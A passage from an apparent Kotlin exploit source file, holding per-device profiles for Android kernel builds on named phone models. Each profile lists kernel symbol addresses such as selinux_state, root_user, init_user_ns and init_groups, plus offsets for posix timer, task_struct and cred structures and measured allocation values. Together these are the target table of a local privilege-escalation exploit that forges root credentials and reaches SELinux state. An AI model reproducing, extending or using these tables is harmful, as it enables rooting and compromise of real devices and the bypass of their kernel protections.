                "selinux_state" to 0xFFFFFFC0823CA418uL.toLong(),
                "root_user" to 0xFFFFFFC08219F228uL.toLong(),
                "init_user_ns" to 0xFFFFFFC08219EF98uL.toLong(),
                "init_ucounts" to 0xFFFFFFC0821A0CF8uL.toLong(),
                "init_groups" to 0xFFFFFFC0821A0788uL.toLong(),
            ),
            offsets = Offsets(
                itimerSize = 0x108, itimerNode = 0x78, itimerHead = 0x98, itimerElist = 0xA8,
                itimerFiring = 0xB8, itimerHandling = 0xC0,
                taskCred = 0x820, taskComm = 0x830,
                credSize = 0xB8, credUid = 0x8,
                credSecurity = 0x80, credUser = 0x88,
                credUserNs = 0x90, credUcounts = 0x98, credGroups = 0xA0,
            ),
            measured = Measured(
                timerSiteOffset = 0x94,
                credSiteLow21 = 0x3870C,
                taskAllocLow21 = 0x1CAC20,
                taskAllocBytes = 0x12C0,
                credReq = 0xB8,
                credAlloc = 0xB8,
            ),
        ),


        Profile(
            name = "PTP-AN10 / 6.6.89-android15-8",
            prefix = "6.6.89-android15-8-g9f1d85cc0389-abogki440235034-4k",
            release = "6.6.89-android15-8-g9f1d85cc0389-abogki440235034-4k",
            models = listOf("PTP-AN10"),
            symbols = mapOf(
                "do_timer_create" to 0xFFFFFFC080397868uL.toLong(),
                "selinux_state" to 0xFFFFFFC082396FD8uL.toLong(),
                "root_user" to 0xFFFFFFC08216F130uL.toLong(),
                "init_user_ns" to 0xFFFFFFC08216EEA0uL.toLong(),
                "init_ucounts" to 0xFFFFFFC082170C00uL.toLong(),
                "init_groups" to 0xFFFFFFC082170690uL.toLong(),
            ),
            offsets = Offsets(
                itimerSize = 0x108, itimerNode = 0x78, itimerHead = 0x98, itimerElist = 0xA8,
                itimerFiring = 0xB8, itimerHandling = 0xC0,
                taskCred = 0x820, taskComm = 0x830,
                credSize = 0xB8, credUid = 0x8,
                credSecurity = 0x80, credUser = 0x88,
                credUserNs = 0x90, credUcounts = 0x98, credGroups = 0xA0,
            ),
            measured = Measured(
                timerSiteOffset = 0x94,
                credSiteLow21 = 0x3C010,
                taskAllocLow21 = 0x37904,
                taskAllocBytes = 0x12C0,
                credReq = 0xB8,
                credAlloc = 0xB8,
            ),
        ),


        Profile(
            name = "ROD2-W09 / 6.1.157-android14-11",
            prefix = "6.1.157-android14-11-g8d63307071ad",
            release = "6.1.157-android14-11-g8d63307071ad",
            models = listOf("ROD2-W09"),
            symbols = mapOf(
                "do_timer_create" to 0xFFFFFFC0084A8CD8uL.toLong(),
                "selinux_state" to 0xFFFFFFC00A84B3A8uL.toLong(),
                "panic_on_warn" to 0xFFFFFFC00A1EAE0CuL.toLong(),
                "root_user" to 0xFFFFFFC00A212BA0uL.toLong(),
                "init_user_ns" to 0xFFFFFFC00A212910uL.toLong(),
                "init_ucounts" to 0xFFFFFFC00A214430uL.toLong(),
                "init_groups" to 0xFFFFFFC00A213EC0uL.toLong(),
            ),
            offsets = Offsets(
                itimerSize = 0x118, itimerNode = 0x78, itimerHead = 0x98, itimerElist = 0xA8,
                itimerFiring = 0xB8, itimerHandling = 0xC0,
                taskCred = 0x840, taskComm = 0x850,
                credSize = 0xB0, credUid = 0x4,
                credSecurity = 0x78, credUser = 0x80,
                credUserNs = 0x88, credUcounts = 0x90, credGroups = 0x98,
            ),
            measured = Measured(
                timerSiteOffset = 0xB8,
                credSiteLow21 = 0x4B790,
                taskAllocLow21 = 0x103D58,
                taskAllocBytes = 0x1300,
                credReq = 0xB0,
                credAlloc = 0xB0,
            ),
        ),

        Profile(
            name = "6.1.128-android14-11",
            prefix = "6.1.128-android14-11-g52c266270871",
            release = "6.1.128-android14-11-g52c266270871",
            symbols = mapOf(
                "do_timer_create" to 0xFFFFFFC008445DD0uL.toLong(),
                "selinux_state" to 0xFFFFFFC00A827FA8uL.toLong(),
                "panic_on_warn" to 0xFFFFFFC00A1CAE08uL.toLong(),
                "root_user" to 0xFFFFFFC00A1F2C20uL.toLong(),
                "init_user_ns" to 0xFFFFFFC00A1F2990uL.toLong(),
                "init_ucounts" to 0xFFFFFFC00A1F44B0uL.toLong(),
                "init_groups" to 0xFFFFFFC00A1F3F40uL.toLong(),
            ),
            offsets = Offsets(
                itimerSize = 0x118, itimerNode = 0x78, itimerHead = 0x98, itimerElist = 0xA8,
                itimerFiring = 0xB8, itimerHandling = 0xC0,
                taskCred = 0x840, taskComm = 0x850,
                credSize = 0xB0, credUid = 0x4,
                credSecurity = 0x78, credUser = 0x80,
                credUserNs = 0x88, credUcounts = 0x90, credGroups = 0x98,
            ),
            measured = Measured(
                timerSiteOffset = 0xB8,
                credSiteLow21 = 0x3E244,
                taskAllocLow21 = 0xFBB14,
                taskAllocBytes = 0x1300,
                credReq = 0xB0,
                credAlloc = 0xB0,
            ),
        ),


        Profile(
            name = "6.12.58-g42fcf008ff5c (offsets-only)",
            prefix = "6.12.58-android16-6-g42fcf008ff5c-abogki504518581-4k",
            release = "6.12.58-android16-6-g42fcf008ff5c-abogki504518581-4k",
            models = listOf(),
            // 没有内核 text 符号：只有 4 个 cred 锚点（从官方二进制里直接取的绝对地址）+ 结构偏移。
            symbols = mapOf(
                "root_user" to 0xffffffc082573d38uL.toLong(),
                "init_user_ns" to 0xffffffc082573868uL.toLong(),
                "init_ucounts" to 0xffffffc0825723a0uL.toLong(),
                "init_groups" to 0xffffffc082572128uL.toLong(),
            ),
            offsets = Offsets(
                itimerSize = 0x100, itimerNode = 0x78, itimerHead = 0x98, itimerElist = 0xA8,
                itimerFiring = 0xB8, itimerHandling = 0xC0,
                taskCred = 0x900, taskComm = 0x910,
                credSize = 0xB8, credUid = 0x8,
                credSecurity = 0x80, credUser = 0x88,
                credUserNs = 0x90, credUcounts = 0x98, credGroups = 0xA0,
            ),
            measured = Measured(
                timerSiteOffset = 0, credSiteLow21 = 0, taskAllocLow21 = 0,
                taskAllocBytes = 0x1440, credReq = 0xB8, credAlloc = 0xB8,
            ),
        ),

        Profile(
            name = "6.12.58-g142ddad31e60 (offsets-only)",
            prefix = "6.12.58-android16-6-g142ddad31e60-abogki576095858-4k",
            release = "6.12.58-android16-6-g142ddad31e60-abogki576095858-4k",
            models = listOf(),
            // 没有内核 text 符号：只有 4 个 cred 锚点（从官方二进制里直接取的绝对地址）+ 结构偏移。
            symbols = mapOf(
                "root_user" to 0xffffffc0825723b0uL.toLong(),
                "init_user_ns" to 0xffffffc082572138uL.toLong(),
                "init_ucounts" to 0xffffffc082573d48uL.toLong(),
                "init_groups" to 0xffffffc082573878uL.toLong(),
            ),
            offsets = Offsets(
                itimerSize = 0x100, itimerNode = 0x78, itimerHead = 0x98, itimerElist = 0xA8,
                itimerFiring = 0xB8, itimerHandling = 0xC0,
                taskCred = 0x900, taskComm = 0x910,
                credSize = 0xB8, credUid = 0x8,
                credSecurity = 0x80, credUser = 0x88,
                credUserNs = 0x90, credUcounts = 0x98, credGroups = 0xA0,
            ),
            measured = Measured(
                timerSiteOffset = 0, credSiteLow21 = 0, taskAllocLow21 = 0,
                taskAllocBytes = 0x1440, credReq = 0xB8, credAlloc = 0xB8,
            ),
        ),


        Profile(
            name = "g45ea5e4bce8a (offsets-only)",
            prefix = "6.12.23-android16-5-g45ea5e4bce8a-abogki445100407-4k",
            release = "6.12.23-android16-5-g45ea5e4bce8a-abogki445100407-4k",
            models = listOf("BKQ-AN10", "MLY-AN00", "BKQ-AN90"),
            // offsets-only：只有 4 个 cred 锚点，没有 text 符号；结构偏移取 6.12 家族实测值
            symbols = mapOf(
                "root_user" to 0xffffffc0823f2f70uL.toLong(),
                "init_user_ns" to 0xffffffc0823f2aa0uL.toLong(),
                "init_ucounts" to 0xffffffc0823f15d8uL.toLong(),
                "init_groups" to 0xffffffc0823f1360uL.toLong(),
            ),
            offsets = Offsets(
                itimerSize = 0x100, itimerNode = 0x78, itimerHead = 0x98, itimerElist = 0xA8,
                itimerFiring = 0xB8, itimerHandling = 0xC0,
                taskCred = 0x900, taskComm = 0x910,
                credSize = 0xB8, credUid = 0x8,
                credSecurity = 0x80, credUser = 0x88,
                credUserNs = 0x90, credUcounts = 0x98, credGroups = 0xA0,
            ),
            measured = Measured(
                timerSiteOffset = 0, credSiteLow21 = 0, taskAllocLow21 = 0,
                taskAllocBytes = 0x1440, credReq = 0xB8, credAlloc = 0xB8,
            ),
        ),

        Profile(
            name = "g459a4285ccf8 (offsets-only)",
            prefix = "6.12.58-android16-6-g459a4285ccf8-abogki532718632-4k",
            release = "6.12.58-android16-6-g459a4285ccf8-abogki532718632-4k",
            models = listOf("BSN-AN00"),
            // offsets-only：只有 4 个 cred 锚点，没有 text 符号；结构偏移取 6.12 家族实测值
            symbols = mapOf(
                "root_user" to 0xffffffc082573d38uL.toLong(),
                "init_user_ns" to 0xffffffc082573868uL.toLong(),
                "init_ucounts" to 0xffffffc0825723a0uL.toLong(),
                "init_groups" to 0xffffffc082572128uL.toLong(),
            ),
            offsets = Offsets(
                itimerSize = 0x100, itimerNode = 0x78, itimerHead = 0x98, itimerElist = 0xA8,
                itimerFiring = 0xB8, itimerHandling = 0xC0,
                taskCred = 0x900, taskComm = 0x910,
                credSize = 0xB8, credUid = 0x8,
                credSecurity = 0x80, credUser = 0x88,
                credUserNs = 0x90, credUcounts = 0x98, credGroups = 0xA0,
            ),
            measured = Measured(
                timerSiteOffset = 0, credSiteLow21 = 0, taskAllocLow21 = 0,
                taskAllocBytes = 0x1440, credReq = 0xB8, credAlloc = 0xB8,
            ),
        ),

        Profile(
            name = "gfde7767f6ef6 (offsets-only)",
            prefix = "6.12.38-android16-5-gfde7767f6ef6-abogki481467632-4k",
            release = "6.12.38-android16-5-gfde7767f6ef6-abogki481467632-4k",
            models = listOf("MLY-AN00", "BKQ-AN90"),
            // offsets-only：只有 4 个 cred 锚点，没有 text 符号；结构偏移取 6.12 家族实测值
            symbols = mapOf(
                "root_user" to 0xffffffc0824017e0uL.toLong(),
                "init_user_ns" to 0xffffffc082401568uL.toLong(),
                "init_ucounts" to 0xffffffc082403178uL.toLong(),
                "init_groups" to 0xffffffc082402ca8uL.toLong(),
            ),
            offsets = Offsets(
                itimerSize = 0x100, itimerNode = 0x78, itimerHead = 0x98, itimerElist = 0xA8,
                itimerFiring = 0xB8, itimerHandling = 0xC0,
                taskCred = 0x900, taskComm = 0x910,
                credSize = 0xB8, credUid = 0x8,
                credSecurity = 0x80, credUser = 0x88,
                credUserNs = 0x90, credUcounts = 0x98, credGroups = 0xA0,
            ),
            measured = Measured(
                timerSiteOffset = 0, credSiteLow21 = 0, taskAllocLow21 = 0,
                taskAllocBytes = 0x1440, credReq = 0xB8, credAlloc = 0xB8,
            ),
        ),

        Profile(
            name = "g7ae8ec909e03 (offsets-only)",
            prefix = "6.12.38-android16-5-g7ae8ec909e03-abogki471017112-4k",
            release = "6.12.38-android16-5-g7ae8ec909e03-abogki471017112-4k",
            models = listOf("YLP-W00", "BKQ-AN10", "MLY-AN00", "BKQ-AN90"),
            // offsets-only：只有 4 个 cred 锚点，没有 text 符号；结构偏移取 6.12 家族实测值
            symbols = mapOf(
                "root_user" to 0xffffffc0824017e0uL.toLong(),
                "init_user_ns" to 0xffffffc082401568uL.toLong(),
                "init_ucounts" to 0xffffffc082403178uL.toLong(),
                "init_groups" to 0xffffffc082402ca8uL.toLong(),
            ),
            offsets = Offsets(
                itimerSize = 0x100, itimerNode = 0x78, itimerHead = 0x98, itimerElist = 0xA8,
                itimerFiring = 0xB8, itimerHandling = 0xC0,
                taskCred = 0x900, taskComm = 0x910,
                credSize = 0xB8, credUid = 0x8,
                credSecurity = 0x80, credUser = 0x88,
                credUserNs = 0x90, credUcounts = 0x98, credGroups = 0xA0,
            ),
            measured = Measured(
                timerSiteOffset = 0, credSiteLow21 = 0, taskAllocLow21 = 0,
                taskAllocBytes = 0x1440, credReq = 0xB8, credAlloc = 0xB8,
            ),
        ),

        Profile(
            name = "gcd85666d7884 (offsets-only)",
            prefix = "6.12.23-android16-5-gcd85666d7884-abogki452537391-4k",
            release = "6.12.23-android16-5-gcd85666d7884-abogki452537391-4k",
            models = listOf(),
            // offsets-only：只有 4 个 cred 锚点，没有 text 符号；结构偏移取 6.12 家族实测值
            symbols = mapOf(
                "root_user" to 0xffffffc0823f2f70uL.toLong(),
                "init_user_ns" to 0xffffffc0823f2aa0uL.toLong(),
                "init_ucounts" to 0xffffffc0823f15d8uL.toLong(),
                "init_groups" to 0xffffffc0823f1360uL.toLong(),
            ),
            offsets = Offsets(
                itimerSize = 0x100, itimerNode = 0x78, itimerHead = 0x98, itimerElist = 0xA8,
                itimerFiring = 0xB8, itimerHandling = 0xC0,
                taskCred = 0x900, taskComm = 0x910,
                credSize = 0xB8, credUid = 0x8,
                credSecurity = 0x80, credUser = 0x88,
                credUserNs = 0x90, credUcounts = 0x98, credGroups = 0xA0,
            ),
            measured = Measured(
                timerSiteOffset = 0, credSiteLow21 = 0, taskAllocLow21 = 0,
                taskAllocBytes = 0x1440, credReq = 0xB8, credAlloc = 0xB8,
            ),
        ),


        Profile(
            name = "g3306a328b7be (offsets-only)",
            prefix = "6.1.157-android14-11-g3306a328b7be-abogki",
            release = "6.1.157-android14-11-g3306a328b7be-abogki",
            models = emptyList(),
            // offsets-only：4 个 cred 锚点直取；结构偏移按 A157 变体
            symbols = mapOf(
                "root_user" to 0xffffffc00a0d09d8uL.toLong(),
                "init_user_ns" to 0xffffffc00a0d0748uL.toLong(),
                "init_ucounts" to 0xffffffc00a0d2268uL.toLong(),
                "init_groups" to 0xffffffc00a0d1cf8uL.toLong(),
            ),
            offsets = Offsets(
                itimerSize = 0x108, itimerNode = 0x78, itimerHead = 0x98, itimerElist = 0xA8,
                itimerFiring = 0xB8, itimerHandling = 0xC0,
                taskCred = 0x838, taskComm = 0x848,
                credSize = 0xb0, credUid = 0x4,
                credSecurity = 0x80, credUser = 0x88,
                credUserNs = 0x90, credUcounts = 0x98, credGroups = 0xA0,
            ),
            measured = Measured(
                timerSiteOffset = 0, credSiteLow21 = 0, taskAllocLow21 = 0,
                taskAllocBytes = 0x12c0, credReq = 0xb0, credAlloc = 0xb0,
            ),
        ),

        Profile(
            name = "g77f76e323a02 (offsets-only)",
            prefix = "6.1.157-android14-11-g77f76e323a02-abogki",
            release = "6.1.157-android14-11-g77f76e323a02-abogki",
            models = emptyList(),
            // offsets-only：4 个 cred 锚点直取；结构偏移按 B157 变体
            symbols = mapOf(
                "root_user" to 0xffffffc00a212ba0uL.toLong(),
                "init_user_ns" to 0xffffffc00a212910uL.toLong(),
                "init_ucounts" to 0xffffffc00a214430uL.toLong(),
                "init_groups" to 0xffffffc00a213ec0uL.toLong(),
            ),
            offsets = Offsets(
                itimerSize = 0x118, itimerNode = 0x78, itimerHead = 0x98, itimerElist = 0xA8,
                itimerFiring = 0xB8, itimerHandling = 0xC0,
                taskCred = 0x840, taskComm = 0x850,
                credSize = 0xb0, credUid = 0x4,
                credSecurity = 0x80, credUser = 0x88,
                credUserNs = 0x90, credUcounts = 0x98, credGroups = 0xA0,
            ),
            measured = Measured(
                timerSiteOffset = 0, credSiteLow21 = 0, taskAllocLow21 = 0,
                taskAllocBytes = 0x1300, credReq = 0xb0, credAlloc = 0xb0,
            ),
        ),

        Profile(
            name = "BVL-AN16 / 6.1.157-android14-11",
            prefix = "6.1.157-android14-11-g84ffa64b710b",
            release = "6.1.157-android14-11-g84ffa64b710b-abogki564062290-4k",
            models = listOf("BVL-AN16"),
            symbols = mapOf(
                "do_timer_create" to 0xFFFFFFC0084A8CD8uL.toLong(),
                "selinux_state" to 0xFFFFFFC00A84B3A8uL.toLong(),
                "panic_on_warn" to 0xFFFFFFC00A1EAE0CuL.toLong(),
                "root_user" to 0xFFFFFFC00A212BA0uL.toLong(),
                "init_user_ns" to 0xFFFFFFC00A212910uL.toLong(),
                "init_ucounts" to 0xFFFFFFC00A214430uL.toLong(),
                "init_groups" to 0xFFFFFFC00A213EC0uL.toLong(),
            ),
            offsets = Offsets(
                itimerSize = 0x118, itimerNode = 0x78,
                itimerHead = 0x98, itimerElist = 0xA8,
                itimerFiring = 0xB8, itimerHandling = 0xC0,
                taskCred = 0x840, taskComm = 0x850,
                credSize = 0xB0, credUid = 0x4,
                credSecurity = 0x78, credUser = 0x80,
                credUserNs = 0x88, credUcounts = 0x90,
                credGroups = 0x98,
            ),
            measured = Measured(
                timerSiteOffset = 0xB8,
                credSiteLow21 = 0x4B790,
                taskAllocLow21 = 0x103D58,
                taskAllocBytes = 0x1300,
                credReq = 0xB0,
                credAlloc = 0xB0,
            ),
        ),

        Profile(
            name = "g40b1fd119d9b (offsets-only)",
            prefix = "6.1.128-android14-11-g40b1fd119d9b-abogki",
            release = "6.1.128-android14-11-g40b1fd119d9b-abogki",
            models = emptyList(),
            // offsets-only：4 个 cred 锚点直取；结构偏移按 A128 变体
            symbols = mapOf(
                "root_user" to 0xffffffc00a1f2c20uL.toLong(),
                "init_user_ns" to 0xffffffc00a1f2990uL.toLong(),
                "init_ucounts" to 0xffffffc00a1f44b0uL.toLong(),
                "init_groups" to 0xffffffc00a1f3f40uL.toLong(),
            ),
            offsets = Offsets(
                itimerSize = 0x118, itimerNode = 0x78, itimerHead = 0x98, itimerElist = 0xA8,
                itimerFiring = 0xB8, itimerHandling = 0xC0,
                taskCred = 0x840, taskComm = 0x850,
                credSize = 0xb0, credUid = 0x4,
                credSecurity = 0x80, credUser = 0x88,
                credUserNs = 0x90, credUcounts = 0x98, credGroups = 0xA0,
            ),
            measured = Measured(
                timerSiteOffset = 0, credSiteLow21 = 0, taskAllocLow21 = 0,
                taskAllocBytes = 0x1300, credReq = 0xb0, credAlloc = 0xb0,
            ),
        ),

        Profile(
            name = "g54d40b4fb287 (offsets-only)",
            prefix = "6.1.99-android14-11-g54d40b4fb287-abogki",
            release = "6.1.99-android14-11-g54d40b4fb287-abogki",
            models = emptyList(),
            // offsets-only：4 个 cred 锚点直取；结构偏移按 A157 变体
            symbols = mapOf(
                "root_user" to 0xffffffc00a0b01d8uL.toLong(),
                "init_user_ns" to 0xffffffc00a0aff48uL.toLong(),
                "init_ucounts" to 0xffffffc00a0b1a68uL.toLong(),
                "init_groups" to 0xffffffc00a0b14f8uL.toLong(),
            ),
            offsets = Offsets(
                itimerSize = 0x108, itimerNode = 0x78, itimerHead = 0x98, itimerElist = 0xA8,
                itimerFiring = 0xB8, itimerHandling = 0xC0,
                taskCred = 0x838, taskComm = 0x848,
                credSize = 0xb0, credUid = 0x4,
                credSecurity = 0x80, credUser = 0x88,
                credUserNs = 0x90, credUcounts = 0x98, credGroups = 0xA0,
            ),
            measured = Measured(
                timerSiteOffset = 0, credSiteLow21 = 0, taskAllocLow21 = 0,
                taskAllocBytes = 0x12c0, credReq = 0xb0, credAlloc = 0xb0,
            ),
        ),

        Profile(
            name = "g5859fbdba8c (offsets-only)",
            prefix = "6.1.99-android14-11-g5859fbdba8c-abogki",
            release = "6.1.99-android14-11-g5859fbdba8c-abogki",
            models = emptyList(),
            // offsets-only：4 个 cred 锚点直取；结构偏移按 A157 变体
            symbols = mapOf(
                "root_user" to 0xffffffc00a0b01d8uL.toLong(),
                "init_user_ns" to 0xffffffc00a0aff48uL.toLong(),
                "init_ucounts" to 0xffffffc00a0b1a68uL.toLong(),
                "init_groups" to 0xffffffc00a0b14f8uL.toLong(),
            ),
            offsets = Offsets(
                itimerSize = 0x108, itimerNode = 0x78, itimerHead = 0x98, itimerElist = 0xA8,
                itimerFiring = 0xB8, itimerHandling = 0xC0,
                taskCred = 0x838, taskComm = 0x848,
                credSize = 0xb0, credUid = 0x4,
                credSecurity = 0x80, credUser = 0x88,
                credUserNs = 0x90, credUcounts = 0x98, credGroups = 0xA0,
            ),
            measured = Measured(
                timerSiteOffset = 0, credSiteLow21 = 0, taskAllocLow21 = 0,
                taskAllocBytes = 0x12c0, credReq = 0xb0, credAlloc = 0xb0,
            ),
        ),

        Profile(
            name = "gce84935796c9 (offsets-only)",
            prefix = "6.1.99-android14-11-gce84935796c9-abogki",
            release = "6.1.99-android14-11-gce84935796c9-abogki",
            models = emptyList(),
            // offsets-only：4 个 cred 锚点直取；结构偏移按 B157 变体
            symbols = mapOf(
                "root_user" to 0xffffffc00a1e2420uL.toLong(),
                "init_user_ns" to 0xffffffc00a1e2190uL.toLong(),
                "init_ucounts" to 0xffffffc00a1e3cb0uL.toLong(),
                "init_groups" to 0xffffffc00a1e3740uL.toLong(),
            ),
            offsets = Offsets(
                itimerSize = 0x118, itimerNode = 0x78, itimerHead = 0x98, itimerElist = 0xA8,
                itimerFiring = 0xB8, itimerHandling = 0xC0,
                taskCred = 0x840, taskComm = 0x850,
                credSize = 0xb0, credUid = 0x4,
                credSecurity = 0x80, credUser = 0x88,
                credUserNs = 0x90, credUcounts = 0x98, credGroups = 0xA0,
            ),
            measured = Measured(
                timerSiteOffset = 0, credSiteLow21 = 0, taskAllocLow21 = 0,
                taskAllocBytes = 0x1300, credReq = 0xb0, credAlloc = 0xb0,
            ),
        ),

        Profile(
            name = "ge9da27488f45 (offsets-only)",
            prefix = "6.1.99-android14-11-ge9da27488f45-abogki",
            release = "6.1.99-android14-11-ge9da27488f45-abogki",
            models = emptyList(),
            // offsets-only：4 个 cred 锚点直取；结构偏移按 A157 变体
            symbols = mapOf(
                "root_user" to 0xffffffc00a0b0998uL.toLong(),
                "init_user_ns" to 0xffffffc00a0b0708uL.toLong(),
                "init_ucounts" to 0xffffffc00a0b2228uL.toLong(),
                "init_groups" to 0xffffffc00a0b1cb8uL.toLong(),
            ),
            offsets = Offsets(
                itimerSize = 0x108, itimerNode = 0x78, itimerHead = 0x98, itimerElist = 0xA8,
                itimerFiring = 0xB8, itimerHandling = 0xC0,
                taskCred = 0x838, taskComm = 0x848,
                credSize = 0xb0, credUid = 0x4,
                credSecurity = 0x80, credUser = 0x88,
                credUserNs = 0x90, credUcounts = 0x98, credGroups = 0xA0,
            ),
            measured = Measured(
                timerSiteOffset = 0, credSiteLow21 = 0, taskAllocLow21 = 0,
                taskAllocBytes = 0x12c0, credReq = 0xb0, credAlloc = 0xb0,
            ),
        ),

        Profile(
            name = "g6484937db664 (offsets-only)",
            prefix = "6.6.58-android15-8-g6484937db664-abogki",
            release = "6.6.58-android15-8-g6484937db664-abogki",
            models = emptyList(),
            // offsets-only：4 个 cred 锚点直取；结构偏移按 A66 变体
            symbols = mapOf(
                "root_user" to 0xffffffc08216f1e0uL.toLong(),
                "init_user_ns" to 0xffffffc08216ef50uL.toLong(),
                "init_ucounts" to 0xffffffc082170cb0uL.toLong(),
                "init_groups" to 0xffffffc082170740uL.toLong(),
            ),
            offsets = Offsets(
                itimerSize = 0x108, itimerNode = 0x78, itimerHead = 0x98, itimerElist = 0xA8,
                itimerFiring = 0xB8, itimerHandling = 0xC0,
                taskCred = 0x820, taskComm = 0x830,
                credSize = 0xb8, credUid = 0x8,
                credSecurity = 0x80, credUser = 0x88,
                credUserNs = 0x90, credUcounts = 0x98, credGroups = 0xA0,
            ),
            measured = Measured(
                timerSiteOffset = 0, credSiteLow21 = 0, taskAllocLow21 = 0,
                taskAllocBytes = 0x12c0, credReq = 0xb8, credAlloc = 0xb8,
            ),
        ),

        Profile(
            name = "AAK-AN00 / 6.6.89-android15",
            prefix = "6.6.89-android15-8-g3c4937385c19-abogki455778110-4k",
            models = listOf("AAK-AN00"),
            release = "6.6.89-android15-8-g3c4937385c19-abogki455778110-4k",
            symbols = mapOf(
                "do_timer_create" to 0xFFFFFFC080397DFCuL.toLong(),
                "selinux_state" to 0xFFFFFFC082396FD8uL.toLong(),
                "panic_on_warn" to 0L,
                "root_user" to 0xFFFFFFC08216F130uL.toLong(),
                "init_user_ns" to 0xFFFFFFC08216EEA0uL.toLong(),
                "init_ucounts" to 0xFFFFFFC082170C00uL.toLong(),
                "init_groups" to 0xFFFFFFC082170690uL.toLong(),
            ),
            offsets = Offsets(
                itimerSize = 0x108, itimerNode = 0x78, itimerHead = 0x98, itimerElist = 0xA8,
                itimerFiring = 0xB8, itimerHandling = 0xC0,
                taskCred = 0x820, taskComm = 0x830,
                credSize = 0xB8, credUid = 0x8,
                credSecurity = 0x80, credUser = 0x88,
                credUserNs = 0x90, credUcounts = 0x98, credGroups = 0xA0,
            ),
            measured = Measured(
                timerSiteOffset = 0x94,
                credSiteLow21 = 0x64F14,
                taskAllocLow21 = 0x60808,
                taskAllocBytes = 0x12C0,
                credReq = 0xB8,
                credAlloc = 0xC0,
            ),
        ),

        Profile(
            name = "ABR-AN80 / 6.12.38-android16",
            prefix = "6.12.38-android16-5-g4b3671e1f5b7-abogki460618149-4k",
            models = listOf("ABR-AN80"),
            release = "6.12.38-android16-5-g4b3671e1f5b7-abogki460618149-4k",
            symbols = mapOf(
                "do_timer_create" to 0xFFFFFFC080D84204uL.toLong(),
                "selinux_state" to 0xFFFFFFC0826663C8uL.toLong(),
                "panic_on_warn" to 0L,
                "root_user" to 0xFFFFFFC0824017E0uL.toLong(),
                "init_user_ns" to 0xFFFFFFC082401568uL.toLong(),
                "init_ucounts" to 0xFFFFFFC082403178uL.toLong(),
                "init_groups" to 0xFFFFFFC082402CA8uL.toLong(),
            ),
            offsets = Offsets(
                itimerSize = 0x100, itimerNode = 0x78, itimerHead = 0x98, itimerElist = 0xA8,
                itimerFiring = 0xB8, itimerHandling = 0xC0,
                taskCred = 0x900, taskComm = 0x910,
                credSize = 0xB8, credUid = 0x8,
                credSecurity = 0x80, credUser = 0x88,
                credUserNs = 0x90, credUcounts = 0x98, credGroups = 0xA0,
            ),
            measured = Measured(
                timerSiteOffset = 0xAC,
                credSiteLow21 = 0x18B714,
                taskAllocLow21 = 0x193C84,
                taskAllocBytes = 0x1440,
                credReq = 0xB8,
                credAlloc = 0xC0,
            ),
        ),

        Profile(
            name = "ABR-L31 / 5.15.180-android13-8",
            prefix = "5.15.180-android13-8-00018-g9b2308ac0ad6",
            models = listOf("ABR-L31"),
            release = "5.15.180-android13-8-00018-g9b2308ac0ad6-ab14563692",
            symbols = mapOf(
                "do_timer_create" to 0xFFFFFFC00827E064uL.toLong(),
                "selinux_state" to 0xFFFFFFC00ADAAD78uL.toLong(),
                "panic_on_warn" to 0L,
                "root_user" to 0xFFFFFFC00AB22770uL.toLong(),
                "init_user_ns" to 0xFFFFFFC00ACCE210uL.toLong(),
                "init_ucounts" to 0xFFFFFFC00AB23FF0uL.toLong(),
                "init_groups" to 0xFFFFFFC00AB23B28uL.toLong(),
            ),
            offsets = Offsets(
                itimerSize = 0x108, itimerNode = 0x78, itimerHead = 0x98, itimerElist = 0xA8,
                itimerFiring = 0xB8, itimerHandling = 0xC0,
                taskCred = 0x798, taskComm = 0x7A8,
                credSize = 0xB0, credUid = 0x4,
                credSecurity = 0x78, credUser = 0x80,
                credUserNs = 0x88, credUcounts = 0x90, credGroups = 0x98,
            ),
            measured = Measured(
                timerSiteOffset = 0xA4,
                credSiteLow21 = 0x18A790,
                taskAllocLow21 = 0x13064C,
                taskAllocBytes = 0x1200,
                credReq = 0xB0,
                credAlloc = 0xC0,
            ),
        ),

        Profile(
            name = "ABR-N33 / 6.12.30-android16",
            prefix = "6.12.30-android16-5-ge3b2afa06218-ab14377253-4k",
            models = listOf("ABR-N33"),
            release = "6.12.30-android16-5-ge3b2afa06218-ab14377253-4k",
            symbols = mapOf(
                "do_timer_create" to 0xFFFFFFC0801E1A58uL.toLong(),
                "selinux_state" to 0xFFFFFFC0826784B8uL.toLong(),
                "panic_on_warn" to 0L,
                "root_user" to 0xFFFFFFC0824117A0uL.toLong(),
                "init_user_ns" to 0xFFFFFFC082411528uL.toLong(),
                "init_ucounts" to 0xFFFFFFC082413138uL.toLong(),
                "init_groups" to 0xFFFFFFC082412C68uL.toLong(),
            ),
            offsets = Offsets(
                itimerSize = 0x100, itimerNode = 0x78, itimerHead = 0x98, itimerElist = 0xA8,
                itimerFiring = 0xB8, itimerHandling = 0xC0,
                taskCred = 0x900, taskComm = 0x910,
                credSize = 0xB8, credUid = 0x8,
                credSecurity = 0x80, credUser = 0x88,
                credUserNs = 0x90, credUcounts = 0x98, credGroups = 0xA0,
            ),
            measured = Measured(
                timerSiteOffset = 0xAC,
                credSiteLow21 = 0x10D424,
                taskAllocLow21 = 0xD0960,
                taskAllocBytes = 0x1440,
                credReq = 0xB8,
                credAlloc = 0xC0,
            ),
        ),

        Profile(
            name = "AMG-AN00 / 6.1.99-android14",
            prefix = "6.1.99-android14-11-g5859fbdbad8c",
            models = listOf("AMG-AN00"),
            release = "6.1.99-android14-11-g5859fbdbad8c",
            symbols = mapOf(
                "do_timer_create" to 0xFFFFFFC00838972CuL.toLong(),
                "selinux_state" to 0xFFFFFFC00A6D89D0uL.toLong(),
                "panic_on_warn" to 0L,
                "root_user" to 0xFFFFFFC00A0B01D8uL.toLong(),
                "init_user_ns" to 0xFFFFFFC00A0AFF48uL.toLong(),
                "init_ucounts" to 0xFFFFFFC00A0B1A68uL.toLong(),
                "init_groups" to 0xFFFFFFC00A0B14F8uL.toLong(),
            ),
            offsets = Offsets(
                itimerSize = 0x108, itimerNode = 0x78, itimerHead = 0x98, itimerElist = 0xA8,
                itimerFiring = 0xB8, itimerHandling = 0xC0,
                taskCred = 0x838, taskComm = 0x848,
                credSize = 0xB0, credUid = 0x4,
                credSecurity = 0x78, credUser = 0x80,
                credUserNs = 0x88, credUcounts = 0x90, credGroups = 0x98,
            ),
            measured = Measured(
                timerSiteOffset = 0x94,
                credSiteLow21 = 0x1003E4,
                taskAllocLow21 = 0x7EBF4,
                taskAllocBytes = 0x12C0,
                credReq = 0xB0,
                credAlloc = 0xC0,
            ),
        ),

        Profile(
            name = "AMM-AN00 / 5.15.180-android13 · 928f00c",
            prefix = "5.15.180-android13-8-g928f00c79361",
